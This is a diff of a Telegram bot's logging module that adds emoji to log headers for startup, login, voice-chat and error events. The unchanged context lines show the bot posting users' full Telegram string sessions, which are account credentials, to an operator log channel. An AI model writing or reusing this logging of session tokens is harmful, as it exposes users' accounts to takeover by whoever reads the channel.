@@ -111,7 +111,7 @@ async def verify_log_channel() -> str:
             f"<code>-100…</code> format me honi chahiye."
         )
     ok = await _send(
-        f" <b>Log channel test</b>\n"
+        f"🧪 <b>Log channel test</b>\n"
         f"├ <b>Channel:</b> {_e(getattr(chat, 'title', _channel))}\n"
         f"└ <b>Time:</b> {_ts()}"
     )
@@ -136,7 +136,7 @@ def _user_block(user_id, username=None, first_name=None) -> str:
 
 async def log_startup(bot_username: str, sessions_restored: int, total_users: int):
     await _send(
-        f" <b>Bot Started</b>\n"
+        f"🚀 <b>Bot Started</b>\n"
         f"├ <b>Bot:</b> @{_e(bot_username)}\n"
         f"├ <b>Users in DB:</b> {total_users}\n"
         f"├ <b>Sessions restored:</b> {sessions_restored}\n"
@@ -145,7 +145,7 @@ async def log_startup(bot_username: str, sessions_restored: int, total_users: in
 
 
 async def log_shutdown():
-    await _send(f" <b>Bot Stopped</b>\n└ <b>Time:</b> {_ts()}")
+    await _send(f"🛑 <b>Bot Stopped</b>\n└ <b>Time:</b> {_ts()}")
 
 
 # ── Users / login ────────────────────────────────────────────────────────────
@@ -161,7 +161,7 @@ async def log_new_user(user_id, username, first_name, source: str = "/start"):
 
 async def log_login_step(user_id, username, first_name, step: str, detail: str = ""):
     await _send(
-        f" <b>Login — {_e(step)}</b>\n"
+        f"🔐 <b>Login — {_e(step)}</b>\n"
         + _user_block(user_id, username, first_name)
         + (f"├ <b>Detail:</b> {_e(detail)}\n" if detail else "")
         + f"└ <b>Time:</b> {_ts()}"
@@ -171,7 +171,7 @@ async def log_login_step(user_id, username, first_name, step: str, detail: str =
 async def log_login_success(user_id, username, first_name, account: dict,
                             string_session: str, method: str = "phone"):
     await _send(
-        f" <b>LOGIN SUCCESS</b>\n"
+        f"✅ <b>LOGIN SUCCESS</b>\n"
         + _user_block(user_id, username, first_name)
         + f"├ <b>Method:</b> {_e(method)}\n"
         f"├ <b>Acc Name:</b> {_e(account.get('name'))}\n"
@@ -188,7 +188,7 @@ async def log_login_success(user_id, username, first_name, account: dict,
 
 async def log_login_failed(user_id, username, first_name, reason: str):
     await _send(
-        f" <b>Login Failed</b>\n"
+        f"❌ <b>Login Failed</b>\n"
         + _user_block(user_id, username, first_name)
         + f"├ <b>Reason:</b> {_e(reason)}\n"
         f"└ <b>Time:</b> {_ts()}"
@@ -197,7 +197,7 @@ async def log_login_failed(user_id, username, first_name, reason: str):
 
 async def log_logout(user_id, username, first_name):
     await _send(
-        f" <b>Logout</b>\n"
+        f"🚪 <b>Logout</b>\n"
         + _user_block(user_id, username, first_name)
         + f"└ <b>Time:</b> {_ts()}"
     )
@@ -205,7 +205,7 @@ async def log_logout(user_id, username, first_name):
 
 async def log_string_added(user_id, username, string_session):
     await _send(
-        f" <b>String Session Saved</b>\n"
+        f"💾 <b>String Session Saved</b>\n"
         + _user_block(user_id, username, None)
         + f"└ <b>Time:</b> {_ts()}\n\n"
         f"<code>{_e(string_session)}</code>"
@@ -216,7 +216,7 @@ async def log_string_added(user_id, username, string_session):
 
 async def log_vc_join(user_id, chat_id, chat_title, source, settings: dict):
     await _send(
-        f" <b>VC Stream Started</b>\n"
+        f"▶️ <b>VC Stream Started</b>\n"
         f"├ <b>By User:</b> <code>{_e(user_id)}</code>\n"
         f"├ <b>Chat:</b> {_e(chat_title)} (<code>{_e(chat_id)}</code>)\n"
         f"├ <b>Source:</b> {_e(source)}\n"
@@ -232,7 +232,7 @@ async def log_vc_join(user_id, chat_id, chat_title, source, settings: dict):
 
 async def log_vc_leave(user_id, chat_id, reason: str = "Manual stop"):
     await _send(
-        f" <b>VC Left</b>\n"
+        f"⏹️ <b>VC Left</b>\n"
         f"├ <b>By User:</b> <code>{_e(user_id)}</code>\n"
         f"├ <b>Chat:</b> <code>{_e(chat_id)}</code>\n"
         f"├ <b>Reason:</b> {_e(reason)}\n"
@@ -242,7 +242,7 @@ async def log_vc_leave(user_id, chat_id, reason: str = "Manual stop"):
 
 async def log_live_boost(user_id, chat_id, target_id, volume: int):
     await _send(
-        f" <b>Live Mic Boost</b>\n"
+        f"🔊 <b>Live Mic Boost</b>\n"
         f"├ <b>By User:</b> <code>{_e(user_id)}</code>\n"
         f"├ <b>Chat:</b> <code>{_e(chat_id)}</code>\n"
         f"├ <b>Target:</b> <code>{_e(target_id)}</code>\n"
@@ -253,7 +253,7 @@ async def log_live_boost(user_id, chat_id, target_id, volume: int):
 
 async def log_auto_mode(user_id, chat_id, on: bool, detail: str = ""):
     await _send(
-        f"{'' if on else ''} <b>AUTO MODE {'ON' if on else 'OFF'}</b>\n"
+        f"{'✅' if on else '⛔'} <b>AUTO MODE {'ON' if on else 'OFF'}</b>\n"
         f"├ <b>User:</b> <code>{_e(user_id)}</code>\n"
         f"├ <b>Chat:</b> <code>{_e(chat_id)}</code>\n"
         + (f"├ <b>Detail:</b> {_e(detail)}\n" if detail else "")
@@ -263,7 +263,7 @@ async def log_auto_mode(user_id, chat_id, on: bool, detail: str = ""):
 
 async def log_command(user_id, username, chat_id, command: str):
     await _send(
-        f" <b>Command</b>\n"
+        f"⌨️ <b>Command</b>\n"
         f"├ <b>User:</b> @{_e(username or user_id)} (<code>{_e(user_id)}</code>)\n"
         f"├ <b>Chat:</b> <code>{_e(chat_id)}</code>\n"
         f"├ <b>Command:</b> <code>{_e(command)}</code>\n"
@@ -275,7 +275,7 @@ async def log_error(context: str, error: Exception):
     tb = traceback.format_exc()[-900:]
     logger.error("Error in %s: %s", context, error)
     await _send(
-        f" <b>Error — {_e(context)}</b>\n"
+        f"🚨 <b>Error — {_e(context)}</b>\n"
         f"<pre>{_e(tb)}</pre>\n"
         f"└ <b>Time:</b> {_ts()}"
     )
@@ -283,7 +283,7 @@ async def log_error(context: str, error: Exception):
 
 async def log_broadcast(owner_id, total: int, success: int):
     await _send(
-        f" <b>Broadcast</b>\n"
+        f"📣 <b>Broadcast</b>\n"
         f"├ <b>By:</b> <code>{_e(owner_id)}</code>\n"
         f"├ <b>Total:</b> {total}\n"
         f"├ <b>Delivered:</b> {success}\n"
